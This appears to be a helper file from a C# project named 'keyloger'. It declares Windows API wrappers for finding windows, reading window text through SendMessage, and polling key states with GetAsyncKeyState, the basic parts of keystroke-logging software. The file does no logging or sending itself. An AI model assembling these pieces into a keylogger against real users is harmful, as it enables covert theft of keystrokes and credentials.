using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace keyloger
{
    public static class WinApiWrapper
    {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);


        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetWindow(IntPtr HWnd, GetWindow_Cmd cmd);


        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, [Out] StringBuilder lParam);

        public enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6,
            WM_GETTEXT = 0x000D
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    }
}
